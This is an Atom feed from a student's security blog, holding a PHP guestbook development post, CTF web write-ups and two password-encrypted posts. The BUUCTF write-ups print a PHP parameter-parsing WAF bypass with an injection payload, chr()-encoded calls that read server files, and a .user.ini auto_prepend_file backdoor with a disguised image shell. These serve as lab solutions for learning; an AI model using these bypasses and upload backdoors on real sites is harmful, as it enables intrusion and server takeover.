<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Da4er&#39;s Blogs</title>
  
  <subtitle>学而专，专而精。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://da4er.top/"/>
  <updated>2020-03-03T13:12:21.440Z</updated>
  <id>https://da4er.top/</id>
  
  <author>
    <name>Da4er&#39;s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP留言板开发</title>
    <link href="https://da4er.top/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91.html"/>
    <id>https://da4er.top/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91.html</id>
    <published>2020-03-03T12:59:59.000Z</published>
    <updated>2020-03-03T13:12:21.440Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经过两天的奋斗，终于把一套简单的PHP留言板开发完成了。这套源码从前台到后台，最后到数据库都是一步一步来完成的，主要是为了熟悉一下PHP开发的基本流程和一些功能点的设计思路，为了接下来的代码审计做准备。</p><a id="more"></a><hr><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>首先设计前端页面，前端页面主要使用的boostraps框架(因为这个框架简单好用23333…)。自己也不会前端，所以用到什么就去Boostrap官网现找。<br>其次是设计数据库，数据库的话需要三张表：user表，comment表，admin表。<br>设计代码如下：<br>comment：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table comment(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    comment varchar(255) not null,</span><br><span class="line">    primary key(id)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8 comment &quot;评论表&quot;</span><br></pre></td></tr></table></figure><hr><p>user表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create table user(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    username varchar(255) not null ,</span><br><span class="line">    password varchar(255) not null ,</span><br><span class="line">    email varchar(255) not null,</span><br><span class="line">    comment varchar(255) not nul ,</span><br><span class="line">    join_date date not null ,</span><br><span class="line">    primary key(id),</span><br><span class="line">    unique key(username),</span><br><span class="line">    unique key(password)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8;</span><br></pre></td></tr></table></figure><hr><p>admin表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create table admin(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    username varchar(255) not null,</span><br><span class="line">    password varchar(255) not null,</span><br><span class="line">    primary key(id)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8</span><br><span class="line"></span><br><span class="line">insert into admin(username,password) values (&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39;);</span><br></pre></td></tr></table></figure><hr><h3 id="功能点分析"><a href="#功能点分析" class="headerlink" title="功能点分析"></a>功能点分析</h3><p>在设计后台代码的时候，首先是分析功能点，这个很重要。<strong>因为大网站都是靠一个个小的功能点堆积起来的。</strong><br>这个留言板主要的功能为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用户注册</span><br><span class="line">用户登录</span><br><span class="line">密码找回</span><br><span class="line">个人信息设置(信息更新 头像上传)</span><br><span class="line">留言发布</span><br><span class="line">留言展示</span><br><span class="line">前台留言分页展示</span><br><span class="line">搜索界面</span><br><span class="line">管理员后台登录</span><br><span class="line">后台用户管理</span><br><span class="line">后台留言管理</span><br></pre></td></tr></table></figure><p>所以在写的时候，要一个功能一个功能的去实现。</p><hr><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>代码就不展示了，太多了23333….. 最后放几张效果图吧</p><img src="/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91/1.png" class title="Da4er"><img src="/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91/2.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;经过两天的奋斗，终于把一套简单的PHP留言板开发完成了。这套源码从前台到后台，最后到数据库都是一步一步来完成的，主要是为了熟悉一下PHP开发的基本流程和一些功能点的设计思路，为了接下来的代码审计做准备。&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发" scheme="https://da4er.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF Web持续更新</title>
    <link href="https://da4er.top/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-03-03T02:47:54.000Z</published>
    <updated>2020-03-03T02:52:57.439Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p><strong>知识点：PHP字符串的解析漏洞。</strong></p><blockquote><p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替，如下图：</p></blockquote><a id="more"></a><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er"><p>当我们传入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20%20da4[er%00&#x3D;42&quot;+AND+1&#x3D;0–</span><br></pre></td></tr></table></figure><p>PHP在解析的时候会自动将不合法的字符转换，转换规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.删除空白符</span><br><span class="line"></span><br><span class="line">2.将某些字符转换为下划线（包括空格）</span><br></pre></td></tr></table></figure><p>所以上面的参数最后会变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">da4_er&#x3D;42&quot; AND 1&#x3D;0–</span><br></pre></td></tr></table></figure><p>从而绕过一些waf的检测。<br><strong>解题：</strong><br>查看网页源代码发现题目存在waf，同时发现calc.php的后台处理程序。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er"><p>访问calc.php:</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><p>当我们传入非int型的参数后，会被waf拦截：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><p>但是可以传入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格num</span><br></pre></td></tr></table></figure><p>绕过waf检测。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><p>绕过之后就是简单的代码执行，但是过滤了一些特殊字符，可以使用chr()函数绕过。<br>首先通过scandir扫描根目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><p>最后通过file_get_contents函数读取文件内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er"><hr><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p><strong>知识点：.user.ini创建隐藏后门。</strong></p><blockquote><p>.user.ini中设置php.ini中PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置，而且只要是在使用 CGI／FastCGI 模式的服务器上都可以使用.user.ini。</p></blockquote><p>利用方法：.user.ini可以自定义php.ini，所以我们可以设置两个参<strong>auto_prepend_file和auto_append_file</strong><br>这两个参数的意思是：如果在上传的.user.ini目录下，有一个可执行的php文件，那么设置这两个参数后可以自动包含其他的php代码文件，如同：<strong>require和include作用一样。</strong></p><p>唯一不一样的是：auto_prepend_file在文件前插入，auto_append_file在文件后插入。<br>所以我们在.user.ini文件中写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;da4er.jpg</span><br></pre></td></tr></table></figure><p>那么在该目录下的可执行php文件中，会自动包含：<strong>require(“./da4er.jpg”);</strong></p><p><strong>解题：</strong><br>首先上传一个小马图片，这个题目作了三个限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不能上传ph或php结尾的，</span><br><span class="line">存在文件头过滤，需要添加图片文件的文件头</span><br><span class="line">文件的内容不能包含&lt;?，但可以上传&lt;script language&#x3D;&#39;php&#39;&gt;&lt;scirpt&gt;类型的图片马来绕过。</span><br></pre></td></tr></table></figure><p>上传后发现目录下还存在一个index.php，这就给利用.user.ini提供了条件</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="Da4er"><p>所以直接上传.user.ini文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;script.jpg</span><br></pre></td></tr></table></figure><p>便可得到flag。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;RoarCTF-2019-Easy-Calc&quot;&gt;&lt;a href=&quot;#RoarCTF-2019-Easy-Calc&quot; class=&quot;headerlink&quot; title=&quot;[RoarCTF 2019]Easy Calc&quot;&gt;&lt;/a&gt;[RoarCTF 2019]Easy Calc&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;知识点：PHP字符串的解析漏洞。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&amp;gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替，如下图：&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>关于我</title>
    <link href="https://da4er.top/%E5%85%B3%E4%BA%8E%E6%88%91.html"/>
    <id>https://da4er.top/%E5%85%B3%E4%BA%8E%E6%88%91.html</id>
    <published>2020-03-02T08:29:56.000Z</published>
    <updated>2020-03-02T08:50:53.164Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><img src="/%E5%85%B3%E4%BA%8E%E6%88%91/1.jpg" class><p>努力赶上大佬的安全小白；<br>励志做一个安全研究员的大学生；<br>三流CTFer。</p><hr><p>2020年计划：<br>用PHP开发一个MVC架构的项目；<br>用Python写一个Scrapy的分布式爬虫；<br>努力刷题，让自己在CTF小有成就。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;img src=&quot;/%E5%85%B3%E4%BA%8E%E6%88%91/1.jpg&quot; class&gt;
&lt;p&gt;努力赶上大佬的安全小白；&lt;br&gt;励志做一个安
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>2020_2月总结</title>
    <link href="https://da4er.top/2020-2%E6%9C%88%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/2020-2%E6%9C%88%E6%80%BB%E7%BB%93.html</id>
    <published>2020-03-02T03:10:39.000Z</published>
    <updated>2020-03-02T03:41:18.847Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="74aa9c474218ccb693706d1f274390a66028c792491e7b50ebcaa87c85587038">5b5a3e44a7afb6280dbf2374db4000a75f207f5ab9f6534d0f1ecba2a15fd4c5889909ab3d8d5dda74a909e2f7d1dd7f39e3a999cac91df2fdfee5f4bb7998e45d0ea263e40ca1297aa6acd89bfdf9f330bed965ec1708a58659da4cd6b48d0c26607f6ba7c06e65cb742bf637ee4696352116ea8f480780e3bcccd2bf48198b604d9293d44b74c665cfdd46d736e2aa16665a8ca733cfe0f7a300ab8e1382be3c94f3d2de850bc096721faa49b4e748f884c9c718fd62c9d70f8d22d03e01cfa0221772001bada8966d5c23f0d0a58c781a572a136f459b6f8a156f6a05f5d183b6b4c45c50068706658683c390d523cb5159d11f458d15c9cf8e6a4c5419a1895fa17afed63455e3a9dfb44a5c1ef17615e57ded75399783ab0a1208ff5c0aef6cf79a4bda27dc2a86b2cba61bee46f2777d93e7b10fa5cf0fb8f24d2207839959ae54833bfe95bfc13a41ec5e9cd9fca9df344125fe80c42553881de414fbbc7d2aa134fd4505bed384600fae2e31a6f021efca0a2dfe816f85b948224620eeed111a00cf3350186249d0eaee5568b87c828708ee594813270907eb57b6fe2c08f5a5a3cb784da48cba5259dd20a9090b43dee064fa1dd0703700b378cbd2a8a3af4f8f9b2e231c4976135d7931b6fefb3d3ea9e66908203e1a5ad9fadc52f33d1752942447aeb6f950bd802261c457718d9640e2674d2aea0cc0a0b458843e7a04c456d52bdcb94b87676b5c47709de984dfbc17c226aff7e57b9e1643fde06f9e3b2832a4699e4d89d155b9dd69ce08266205094662b3c2706e5c1d95863851605115c5ba2f3782ff2f40865726f5fd859fd2cf3b6ae5a55efa4c57ef928fe0b8c58a0f65a04c0dce95edcc24e58bf9284da80ff1528a6706f17b904972f632946dac26fefb5f65eac0911ff60676f2d0c47347daf8009fe2e8d18a28e85151f0a4dafba7461ddc19c38a4666cc5ece40abdb48a58eaf1d2d0cf26233581bb014b1046f6bf23c9def456b80ba61401c882cbb88ee7e8be59f325c9186fdd095d6fb395e1c97395f5bb20ed51c16cdf15ea396f3308018a6f2411942695590cd6dedf8bf3f369cde797d437f08a0ee56c5d9fe339f22f2b64f376ea83f5714af777b90d768132e5be3c9d9026257f33435f6cce36edcdd37c7804febef0a80e0ae9260723f1d52d48b1d3f96a827702d886762a8eb639a265bf8b36b047db2169fe77cbf5b27e82d11785d3436cb6e400c3325a594f3609782ff39a174ffd438b909404fc71830a2926661ae81dd0c1df4425c371357d7cbd91a4b3f43e25da8e3838ab710e9cf674369aa1a5a9388e8e5c005c4fa1819120bdd84684dab352cc54ea0ed0af7d149f8b7160528e165e9a52fb6c2a86eae9080d3119408f249bfca7708b9daf936f0a9e4914519deff3803c770a1cabc0f3e17089c15c30033f546c96fc1964b287a91122fcd69a14e0efee79fffc61729d781c6f5627cbec1c7b1eeb252f7a1dc189be76c71402cb567d53701d8c3148ed7102188185dbeb4f4e88e4318861a955b69dd1657da3f8d59177418978090752205507ea2034312dc62b3c1068387d7b48badcd573354b922c713f8e88caf826d01be003499e5c5dca037e50da48ccb9f32a9d296be86443aa55ed97b144ecfb88f4e0bcbed7234ff80375557026fb11f0721f594202d33a5a59b59f1bc3919071ee8f5980d813cd5e4df325852ae7729de8b92462856acaa73b8986c9c12f381efb7faa368eebff0bd91326459c81b132cd063a4103e8c72444aed643145b0a3da11d9264f292b99e8a29641125b45420f5c1cf6bc4e93e4d5cd2a5a4e249607d51d036369d8840763765fc0dc9e13ab969ead547f31f351fc2899574dddc17b685dc186e0f0b6a83bbfeaf30a8c71ed91b279411f16f0e5f8efb044e160adc995c59f1fb3430b2ebeff9756748cf4e6f39befdf6c1352854397b6138a2fd146038973dedc8b368a33a06d94717dd884e6562a2b6d92d64d4507b8f792748367fd8fd44e00e9b243f8aecadf251edb4088ac17d94b6e</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="随笔" scheme="https://da4er.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>Java学习笔记</title>
    <link href="https://da4er.top/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>https://da4er.top/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</id>
    <published>2020-02-27T10:40:25.000Z</published>
    <updated>2020-03-02T08:29:04.290Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3af6361fe0ab74ef8b5d8a656432e6a62199dc44322996d5059095d587ef12f8">5b5a3e44a7afb6280dbf2374db4000a75f207f5ab9f6534d0f1ecba2a15fd4c5889909ab3d8d5dda74a909e2f7d1dd7fcb84183242a4f406e8b34ca1d4a44d4cbdf15ebaefe39efa0187f7f049cb214627f5b63c702b24399865f6a4bbfb4a296f5d2094573eca13cff48c19dda9220eaa3547e65cdfdbe77f9eaaa607e5bf818be4c2f4ba4c696a504aacb737c0667149a1e483be0f3734b5142030039ac5a3cf246a3f8490100efb22000fb6afbde38cee98c492c8853152d2ba45736bd3c5c347d64009201f4e5d338fcb33267252bd50800a1ee1738e88e121e83cbb86423e319b53ad1ab36f3532f359c812890edc2354476ea73b2ec8419f8a644751bd6ee648cf94ea70bfb747e735db9552ef6f892b7077bd0e9c599f54579878927df40b9ef974bed56c719a2764a6737f9a7dc6eb9ae7c725ff11fe9ea3ffdb450cd8ee89ee710f30e60fd0dd1cac8ff1dac3b31610fe0a90cd2155618348ceb3e485413b89df6bf88a774d25d1a69ab0df951cf64989f5ff4522979f4f08476f927378cf8a199bf54755e890a678f2819a2f420d86b9c9f64c26ce290c8c8d386b9955f3d77fd1423642ebbec4d50b50005196c5eb1d411293d3b5b7666203d22a68377cee16d41b1621f82bd500e78002d81c4dfed4ac64328b4897bfac468c9c69f4e64727579f96f4d8571f02472baf48c3dbf56af08c161c6925e4965114599c4f270e3205eac11e67db5c731e530b26a74627cbe21e3bceeec5c62e3c51c61542f190e690f1c5aa58ef88d6c1a143ba5c667f40651bbb70cd64ad0a013fea19e1d40aa75bdd9149780bc58b99f1a501ad551c3020d62496b1004bfff97d0837fb0f7c04d7af3de8543331be94d7670eb5b3505f55c58b9adb9d41354c10cad66dbe78a6c8ef6e28bb7a9e80a453ca3089575d4c0460848c48ef4c132f6eb3bb48edd663adeb61427cf5a518ce1fd93744486710c694dbed2b1ae4e3bda1182e977d9826791587ffa3d90c4a76b576cf71c2c8597565d9514fc2634c83d3a915173692a00c1ce7cf3a1cd4893f661a1a186f1d315d926877835fd4e109211f63b1953bbc952c839a11839b7c2c6a0f40d748fed0e35cb04d44ae6b3f1993672682f9abf420dbcec85248d63c73b4cea21cae8fcdff1e937bb854a8c15f4c994e34dab202cdef2b27342fb5a53723a41a8623e0fd0966846e0f07cb1d2d086d52ea4f0ae6c86a75ba21c3b93cfd660dfb5adafbed18d1ed2e4f444354a4a4322bf6b7015d9216bfae065e728d63226b5ea8e23f75b977e541434bbaa9305286e8ed223a0d0bd36b1db82662583f007f74ec2b8510346d81d3165ae13c335e4588e187a59a820c97e91d8fb82a441aaaa30016cf589a606a4b691c140acc8c00c913aa5a183daef722e537af1c2ce9077b8b6f4b4904451f1c75c41e60a1b70c1429e775ae1439cd4b77f86b4bf780d8321156dc6f9aed9f44a6bbbce2a737df7cfb2b1467319a7ad300c0221150ac61416f4836d209966eb4c066c3639b774a51323699b0eede0c251b8cdf296cfa243430e4cdba66c027a5694a147aeb47f738d4d62216dfafe2eb8fd8d933edcca7035dbd3685d8a21c86e4bfd33c8cc482638113a5adab62552911e7d78d60847251b7a3f3219816d451a06ad571d12d167a5632be638603aa30ae8cc0ce59e2dff9d7b20f2cd5a89080ade8e9892be4d5f055b0cfe7f4b4327cab38312fea0c817da56048b038ce40d54ed5976ea17ccc0170639abe71024e91270d78de7a230f85335827ad18174c14ed1491fd1a4d462e478e28360556d1e848c3765696926ee2fd2ddb5f71607c35af4ab74aea84696ce1ec758a0fab34a1f976db35183bb0c5670f0ab6ff25853ae01de291f62c2bcfa06116f5e7d6e92c74fb601e77671b33d13f722fddb5968a5209166fd03b980564a7a83de77659f13a3be63124b550d1a9090f640067e9106f32b37e58f04b4c54c56ded63aa3060d529777835348caf61d1268888c45decce83c7b4a1b1b7e49eaab0d4a369e8860b0d7c1b31434855afdf194b7ff39fddf3da59c0283dff168cdbb72626682149ad120a23a85006f3c08232fd89eccb9a68b53e99afddf25bc8cc45fe8842c69bba4e27bbd834866379f3ba696510e487c859974d0d3888a6c630ceddc31c2f6452e55f95e196c8f794893ab636aeceb2c213410a3a607e77ad5c7df7699aef1c348e5e05305fe6346f90ea16a2101597647e3a2c027216ae3655643b9ef6abd2b3ef982f8a34ff6d934c59e882635ff77da7e02c57c04ec1dd08091a1add8ca725cb8541f27af78087001be5d4d301195e950927e81a54613432658044a56facba373fa818ed81ac1ad588dcaeb902d0e590f48a552f390361d4c7d09280c5fca65e3c846a5bc928c071228355af671dbac4c9a26ea353e8d779b0251dc1aa7da376ed8ba71ab12a5c5fa0c4226112436f9dff5226921def7c0ba5c5e79c3db2a28a878f59100b67ec801bc0eab1e3604ddad2936daaf3a501ec9bc06dfbf265dfe143979a5a269e8fdf0cf786515a8962b737aa955de6e3d7d67d9587ecf729dae5b28de58196164f2bf0958aca18f2baa6be1be74d1596466a894f6a2a3f1b3c7a974600fd3d4fb8f00e9c72c819e8929bcf9b23ad8b9fbee669b1f6bebc1150e3afa73131f0e67c037219d464ef1e57725480e615cc7515df904118a257de30e6f1e9bf0ea4480bd719c7a89f8a6d9ccc643922bdb70f86b983acdc7df07a30ca5ee9549cb96eb9c89a742f748f0cfafde9e70d9c41d0d3623e0fcc116afe9b4673d24f9b6264e95888d76ef4ee7d7b247837723b51324fa3ca8fb978bac3597ba35d81cb794d7c53e4fb3aacaf62bef2194105aa419b7afae6bea067d59f373311f1c0157c6d706868dfacfefe6effd2a8e5601453cac0114d92efaf016ad25b8cd8fc43aaf5a9eac5142d798bfc1dec8575ebfd2715cf9bf88eb0c2e239899c5504157c7c25f18df5e079281567da32a3dec00a1c4909d1f8ca76a3578ef465dd28aca3e00d081dcd5f299dbd093c9d9e3e77ed702a3915c79ee7d1e418f907ce37e859c3c9c41b937d3cb529f526eb39c4ed72328055877afc542e44bfeb0ea412438c2d7e05c3672169d7dc23b1bbf8ad39730154deb6ed3a45735b59462ea44fe235ab18bebeb8e1a7b5cbd27356c55925b5cb4c4db21270c9e8eca58cceb639efbc4cda7288a9a3e297fc685e99a20567c054397a6346424e7f06baf0b9050c17261a2da06751cc18ebf5987eb1d09c10f9a2eeb1cc13249e302db1875a561e41f37f073cec1efc1a67fd1337760d8487c765b884ff13439ac20c516796b3bb490a1d044d0a8e5fe28fed1d6206758533d6b60b6d391b4c138ea7694c45c81c2d85b6aeae6006c3e6815932dd0dae4085f54f1f278324257514db7ebe588df5b77402ae3c9db65b1d95bd3b1a7b9b3454f052f1ab34568dde5b8f18643c2b59652eaa6e6385dfd7f60f96258de4b71ce324ca4757307fe7ab7d8236c53ae31b60e613d9db788d6b9165759089d46f378082d21b00ecab1a0287b04523d5f405de30425d2d025030ecd0d119f1d9bfc92e613bad9e52731040071c775d9e1dba30a951fd194f37142366bc064dc92a790959535ad6bb7e463ac0b1c0c57e6fc482f8a8f6a156beb1dd4539a0b95d0a16cbfc4e3f19f9b53e2ae231508f008df4211769aed36db90b211b4c7851cfb67577fae96015190e5faf663695bdf89f00ea460057377007dabf1a96191beaaaf14b8831717b9199a01c853f56da4c809cea6e5c9e066e81bfca5b91a7a4cadbbbda95e7b2696cc7111f141d00b40e7a8e331675fd8ad1c1259878eee8eb1d685c5e6bac3027ef6be8db725b891626518205bd9b379396ca1060facaa952e14647e3f3b29bcdb6554a63176252dcea9529096ba164a80f095ffd63bd1c61f62821976146b20d3be9d871784f2e8d69c64641755bebbd1d01448f6d8f02299a02328d4858427776b0e0d899540e758498ccc201d8d54708fef73b7b40298546234b658d60bd535928f1df7e7f644a2ac9afa831a44e7a6e8b52ba75b033f80f55edc1d993ac2578056edbd48f660dbb0ab87392ba883783594dcc3435d1d08d2c28d77fa067448612034195fb4577e1288c848273d5757b0d352aae60bbdb4edd177f08721e9b73df5faeb01b404b44e507fc794cce72463dbf5d8332386bcd49daf3689dd738656cc99d772913fd8d2e727e4ceb82472a5d6c0798ffde9fd4bd09a41fb530b85434d8cdf9ec931a39378d9f80c727f76a50981a361425a397ca12e38ed7efd16f7da1b3819e2bd564c06a9f63162838d95be90eaa02c2d72f3c99de8f2ae1848b1641d4fe0d38c49b514cd793503873a342546b15881ad0c0d0db803f414f68d54da0bf077a0b4cf4f63768b2fa952c5481a4eeba154f41e44cfb002411dc48310e99d140f5a7d791ed562eebd79c951580ccc38b54027c918cfc169cf7e842d86879b599e9c4100aea02b6369bbe012b5a3181c522b9c502cd4bc8349ccc0c7853400a5f31c9bde0e8d4db80f6e48bba7eda609c5e8f74b5568ea1482a710afc158dc2546918e9e6628bc7ec2b916b135e562672bb6ef19cf722915a64212427b010e941956e75faaf5c100aa1e9e45b67a2066227351f61b49bf5162e2ebd562d548faf38e85cfc54b2e64fa7311d917b67a804a9117b4f07704cef281a9429966305d1bca19e979ab335a04b0f1daf884e09915e30d61c291f2b644aa359f63c0911d11197243a693d2f18b5f07d38cb9fa3356305bf872674da56fd83e8e6a3ff6d3b141e3426900a25cace44252e84b360a02e2633c664bfe96993e6a6edc9d461e7c9ba04526064c2df77ac761a0618742bd3d08566b5a58a99b5fea3c86539d7c069be6ecb0a9a28e07e8cf455cdda036fa7e882cfd35e9ae913bb3b925e61b1fb392bfebae1c6dc178d6ded364932ff4cf9f331e14defc3acc697daa15b0185a5ae951c10e7617e5f1bc6c547dbf25117cd8c8488d4d81b09f9bcaf4ea33f45be4f060978eb6ce1d96d31c23fc1cbaf069417e45b3ed479b6c5aa4e08237c63f18ce225c0e158e29e861c4733399f9ab067608cc6e58d412e94750a0cf35e0ec803df65237812a1cfd9c03163e5579528455f84cf1681798538dee9d5245a107b3953d57c84b1259464c4c6dbb22f8277316d86022a870f5632087538b7764855d89ff9e7ea96052aac8b017a95ec90f9e21b52bcba9871bed52c56488fbbd2394de3e76406088599292123fa410bd80bb9335e7ae6ff5b8417d58f310870e768ef1fa223138f7ad71eac68de1fbac4c1df40fefef492f0408b590642a941b1ee8cea1c98b891c0bb903add2b0d5a33d6282a2566e1e7baf4bdfce8997c8a3b1794f0e9ab7710f92d9c237f2d3654e80d747b2f0ab8176370a0b3cd28043887f842728704bfd55a0fc8928c5a1e3994428521fedd6ccec943476a39b120188c59c754cc567d83f23365e85e15f778fa444d0edfce67bc65d2ce8d0ac28fdc32439034a5088798c77fc8226a76a2d16d113898b8f224620aa3ec85e6bc6fb34202478cf1ac96421070a893a1c4a6c398c95e47729232b44c6a2744b082409ca972a75bcc1cbf1fd55cc79bebceb588fa73b0a9f1a63fe